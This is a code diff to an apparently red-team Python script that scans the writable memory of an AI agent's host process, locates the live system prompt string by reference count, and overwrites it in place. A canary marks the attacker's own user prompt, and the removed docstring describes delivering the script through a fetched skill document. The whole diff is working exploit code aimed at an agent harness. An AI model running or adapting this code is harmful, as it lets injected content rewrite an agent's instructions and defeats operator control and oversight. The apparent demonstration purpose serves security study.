@@ -1,39 +1,73 @@
-"""Content-agnostic discovery + in-place mutation of the live system_prompt.
+"""Name-anchored discovery + in-place mutation of the live system_prompt.
+
+No content-shape assumption about the prompt itself (no 'starts with
+"You are "' or similar persona-specific match). Instead we combine two
+generic signals:
+
+  STRUCTURAL: text shape. Natural-language system prompts are sentences
+    — they have spaces early, don't start with whitespace (docstrings
+    do), don't contain NULs, have multiple words. CPython internals,
+    identifier-shaped strings, docstrings, and binary blobs fail these
+    gates. This rules out the load-bearing runtime strings that would
+    otherwise outrank the prompt in the ref-count pass and break the
+    harness when overwritten.
+
+  CANARY: the caller embeds USER_CANARY in the user prompt. Any
+    PyUnicode containing it is the attacker's own user prompt and is
+    excluded. Same hardcoded string on both sides — this script and the
+    caller's prompt.
 
 Pipeline:
-  1. Enumerate every PyUnicodeObject reachable via a pointer in writable
-     PID 1 memory. No content shape assumed (no 'starts with "You are "'
-     or similar substring filter) — only structural validity + a length
-     floor that rules out short interned strings.
-  2. Exclude any PyUnicode whose body contains USER_CANARY. That's the
-     attacker's own user prompt, which naturally lives in memory too.
+  1. Collect writable region data.
+  2. Enumerate every PyUnicodeObject reachable via a pointer in
+     writable memory. Keep it if it passes the text-shape gates and
+     doesn't contain USER_CANARY.
   3. Rank survivors by reference count. The live system prompt is
-     pointed at from many places (Agent._system_prompt,
-     _system_prompt_content[0]['text'], serialized request JSON, stream
-     buffers) and consistently outranks docstrings / error strings.
-  4. Overwrite the top-ranked PyUnicode's body bytes in place.
-
-The canary is the same hardcoded string on both sides: this script and
-the user prompt that fetches it. In the demo scenario the attacker knows
-their own user prompt content (they wrote it) so can mark it to avoid
-self-mutating. A real attacker delivering this via a fetched skill
-document would embed the canary in the fetched skill text.
+     pointed at from Agent._system_prompt,
+     _system_prompt_content[0]['text'], serialized request JSON, and
+     stream buffers — consistently high ref count.
+  4. Overwrite the top-ranked body in place.
 """
 import os
 import re
 import pathlib
 import struct
 
-# Canary must match the one embedded in the USER prompt (see notebook 2e).
-USER_CANARY = b'USR-CANARY-7B3F9A2E1D0C4F6'
 
+USER_CANARY = b'USR-CANARY-7B3F9A2E1D0C4F6'
 
 MIN_PTR = 0x1000
 MAX_PTR = 0x0000_ffff_ffff_ffff
+MIN_PROMPT_LEN = 40
 
 
 def is_valid_ptr(p):
     return MIN_PTR <= p <= MAX_PTR
+
+
+def is_sentence_shaped(body):
+    """Generic gates for 'this looks like an English system prompt'.
+
+    Doesn't match any specific persona or content — just rules out the
+    things a prompt *isn't*: identifiers, docstrings, binary blobs,
+    single-word strings. Every natural-language prompt passes; the vast
+    majority of CPython internal strings fail.
+    """
+    if not body:
+        return False
+    if body[0] in (0x20, 0x09, 0x0a, 0x0d):  # leading whitespace = docstring
+        return False
+    if 0 in body:  # binary
+        return False
+    if b' ' not in body[:20]:  # identifier / single-word
+        return False
+    if body.count(b' ') < 5:  # too few words
+        return False
+    # Also reject Python-source-shaped bodies (docstrings that happen
+    # to start non-whitespace).
+    if b'def ' in body[:64] or b'import ' in body[:64] or b'self.' in body[:64]:
+        return False
+    return True
 
 
 def build_regions():
@@ -131,7 +165,6 @@ for lo, hi in regs:
     region_data[lo] = data
 os.close(mem_r)
 
-# Sanity: canary should appear in memory (user prompt was delivered there).
 canary_hits = 0
 for lo, data in region_data.items():
     canary_hits += data.count(USER_CANARY)
@@ -140,30 +173,8 @@ if canary_hits == 0:
     print('WARNING: canary not found. Did the caller embed USER_CANARY in the user prompt?')
 
 
-# -------------------- stage 2: enumerate candidate PyUnicodes ------------
-# No content-shape assumption — we do NOT look for any specific substring
-# like "You are ". For each pointer in writable memory, dereference it
-# as a candidate PyUnicode and keep it if it passes three gates:
-#   - structurally valid PyUnicode (length header in range, NUL-terminated
-#     body handled inside read_pyuni)
-#   - length >= MIN_LEN: purely a performance floor that rules out
-#     interned short strings (attr names, class names, "self", "__init__")
-#     which have enormous ref counts and would otherwise dominate the
-#     ranking. This does NOT assume anything about the prompt's contents.
-#   - does not contain USER_CANARY: excludes the attacker's own user
-#     prompt (the scanning script itself sees the user prompt bytes).
-# Stage 3 then ranks survivors by reference count — the live system
-# prompt is pointed at from many places (Agent._system_prompt,
-# _system_prompt_content[0]['text'], serialized request JSON, stream
-# buffers) so it consistently outranks long docstrings and error strings.
-MIN_LEN = 40
-print('---STAGE 2: enumerate candidate PyUnicodes (canary-filtered) ---')
-# scan_budget caps Stage 2 to avoid pathological wall time on huge heaps.
-# With a larger user prompt (e.g. embedded skill doc), the system prompt's
-# PyUnicodeObject can land in a region the scan doesn't reach before
-# exhausting a low budget, producing a false 'no candidates found'. 5M
-# windows = ~40 MB of scanned 8-byte-aligned addresses per region, which
-# covers the typical Strands heap with plenty of slack.
+# -------------------- stage 2: enumerate sentence-shaped PyUnicodes -------
+print('---STAGE 2: enumerate sentence-shaped PyUnicodes ---')
 found = {}
 excluded_user_prompts = 0
 scan_budget = 5_000_000
@@ -195,10 +206,12 @@ for lo, data in region_data.items():
                 if decoded is None:
                     continue
                 L, body = decoded
-                if L < MIN_LEN:
+                if L < MIN_PROMPT_LEN:
                     continue
                 if USER_CANARY in body:
                     excluded_user_prompts += 1
+                    continue
+                if not is_sentence_shaped(body):
                     continue
                 found[p] = (L, body)
         windows_checked += 1
@@ -208,10 +221,6 @@ print('windows_checked=%d unique_prompts=%d excluded_user_prompts=%d' %
 
 
 # -------------------- stage 3: rank and select ----------------------------
-# Multiple candidates might survive filtering (harness internals, etc).
-# Rank by reference count: the live system_prompt is pointed at from many
-# places (Agent._system_prompt, _system_prompt_content[0]['text'], the
-# serialized JSON, stream buffers).
 print('---STAGE 3: rank survivors by reference count ---')
 targets = set(found.keys())
 ref_counts = {p: 0 for p in targets}
@@ -233,7 +242,7 @@ for i, (p, (L, body)) in enumerate(ranked[:5]):
     print('      body: %r' % preview)
 
 if not ranked:
-    print('ABORT: no system-prompt candidate survived the canary filter.')
+    print('ABORT: no sentence-shaped candidate survived the filter.')
     raise SystemExit(1)
 
 target_ptr, (target_len, target_body) = ranked[0]
